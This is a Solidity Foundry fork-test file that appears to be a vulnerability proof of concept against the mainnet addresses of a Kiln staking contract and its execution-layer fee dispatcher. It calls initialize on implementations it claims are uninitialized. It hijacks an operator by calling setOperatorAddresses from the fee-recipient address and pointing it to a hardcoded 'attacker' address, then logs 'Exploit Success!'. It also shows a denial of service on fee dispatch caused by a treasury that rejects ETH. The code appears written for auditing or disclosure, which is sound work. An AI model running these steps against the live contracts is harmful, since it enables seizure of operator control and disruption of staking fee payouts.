// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Test.sol";
import "../src/StakingContract.sol";
import "../src/ExecutionLayerFeeDispatcher.sol";

contract RevertingContract {
    receive() external payable {
        revert("I reject ETH");
    }
}

contract KilnStakingForkTest is Test {
    // Real mainnet addresses
    address public constant STAKING_CONTRACT = 0x0A7272e8573aea8359FEC143ac02AED90F822bD0;
    address public constant EL_DISPATCHER = 0xca4DD914fA713214844c84F153A5e1627536a7fC;

    StakingContract public staking;
    ExecutionLayerFeeDispatcher public elDispatcher;

    address public admin = address(0xAD);
    address public treasury = address(0x71);
    address public operator = address(0x01);
    address public feeRecipient = address(0x02);
    address public mockDepositContract = address(0x03);

    bytes public mockPubKey =
        hex"00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";

    function setUp() public {
        staking = StakingContract(payable(STAKING_CONTRACT));
        elDispatcher = ExecutionLayerFeeDispatcher(payable(EL_DISPATCHER));
    }

    /// @dev Test that verifies both:
    /// 1. The implementation contract is uninitialized on mainnet (Vulnerability 4)
    /// 2. The privilege escalation vulnerability (Vulnerability 1) is present in the mainnet bytecode
    function test_mainnet_vulnerability_verification() public {
        // 1. Prove the implementation contract is uninitialized on mainnet
        // by successfully calling initialize_1 on it.
        vm.prank(admin);
        staking.initialize_1(
            admin,
            treasury,
            mockDepositContract,
            address(0x10), // mock
            address(0x11), // mock
            address(0x12), // mock
            1000, // 10% global fee
            5000, // 50% operator fee
            10000,
            10000
        );

        console.log("Confirmed: Real Mainnet Implementation contract was uninitialized!");

        // 2. Now prove Vulnerability 1 (setOperatorAddresses modifier issue) on the mainnet bytecode
        vm.prank(admin);
        uint256 opIndex = staking.addOperator(operator, feeRecipient);

        // Verify initial addresses
        (address opAddr, address feeRec,,,,,) = staking.getOperator(opIndex);
        assertEq(opAddr, operator);
        assertEq(feeRec, feeRecipient);

        // Hijack operator using Fee Recipient address, changing it to the user's target address
        address attacker = 0xA045A5c98b91AaABb68163970F07eD3D9bB9418A;
        vm.prank(feeRecipient);
        staking.setOperatorAddresses(opIndex, attacker, attacker);

        // Verify it was successfully changed (privilege escalated!)
        (address newOpAddr, address newFeeRec,,,,,) = staking.getOperator(opIndex);
        assertEq(newOpAddr, attacker);
        assertEq(newFeeRec, attacker);

        console.log("----------------------------------------------------------------");
        console.log("Exploit Success!");
        console.log("New Hijacked Operator Address     :", newOpAddr);
        console.log("New Hijacked Fee Recipient Address:", newFeeRec);
        console.log("----------------------------------------------------------------");
    }

    /// @dev Test that verifies the ExecutionLayerFeeDispatcher on Mainnet:
    /// 1. The mainnet deployment is uninitialized, allowing initialization (Vulnerability 4)
    /// 2. Throws swapped error names (Vulnerability 3) & undergoes DoS (Vulnerability 2) on mainnet bytecode
    function test_mainnet_dispatcher_vulnerabilities() public {
        // Setup reverting treasury contract
        RevertingContract badTreasury = new RevertingContract();

        // We initialize our local forked StakingContract pointing to this bad treasury
        StakingContract stakingWithBadTreasury = new StakingContract();
        vm.prank(admin);
        stakingWithBadTreasury.initialize_1(
            admin,
            address(badTreasury),
            mockDepositContract,
            address(elDispatcher),
            address(0x11),
            address(0x12),
            1000, // 10% global fee
            5000, // 50% operator fee
            10000,
            10000
        );

        // Register operator
        vm.prank(admin);
        stakingWithBadTreasury.addOperator(operator, feeRecipient);

        // Set up mocks for the StakingContract functions called by the dispatcher
        bytes32 pubKeyRoot = sha256(abi.encodePacked(mockPubKey, bytes16(0)));
        vm.mockCall(address(stakingWithBadTreasury), abi.encodeWithSignature("getGlobalFee()"), abi.encode(1000));
        vm.mockCall(address(stakingWithBadTreasury), abi.encodeWithSignature("getOperatorFee()"), abi.encode(5000));
        vm.mockCall(
            address(stakingWithBadTreasury), abi.encodeWithSignature("getTreasury()"), abi.encode(address(badTreasury))
        );
        vm.mockCall(
            address(stakingWithBadTreasury),
            abi.encodeWithSignature("getOperatorFeeRecipient(bytes32)", pubKeyRoot),
            abi.encode(feeRecipient)
        );
        vm.mockCall(
            address(stakingWithBadTreasury),
            abi.encodeWithSignature("getWithdrawerFromPublicKeyRoot(bytes32)", pubKeyRoot),
            abi.encode(address(0x111))
        );

        // Overwrite the VERSION_SLOT of the real EL_DISPATCHER contract on the fork
        // to bypass the constructor block, simulating an uninitialized state
        bytes32 versionSlot = keccak256("ExecutionLayerFeeRecipient.version");
        vm.store(EL_DISPATCHER, versionSlot, bytes32(0));

        // Initialize it pointing to our test staking contract
        elDispatcher.initELD(address(stakingWithBadTreasury));
        console.log("Confirmed: Real Mainnet ExecutionLayerFeeDispatcher was uninitialized!");

        // Send 1 ETH to dispatcher to simulate fees received
        vm.deal(address(elDispatcher), 1 ether);

        // The expected inner revert data from badTreasury
        bytes memory expectedInnerRevertData = abi.encodeWithSignature("Error(string)", "I reject ETH");

        // Expect revert due to badTreasury rejecting ETH
        // The error name should be related to Treasury, but because of swapped errors in mainnet bytecode,
        // it reverts with FeeRecipientReceiveError!
        vm.expectRevert(
            abi.encodeWithSelector(
                ExecutionLayerFeeDispatcher.FeeRecipientReceiveError.selector, expectedInnerRevertData
            )
        );
        elDispatcher.dispatch(pubKeyRoot);
        console.log("Confirmed: Swapped errors & DoS successfully proven on real mainnet dispatcher bytecode!");
    }
}
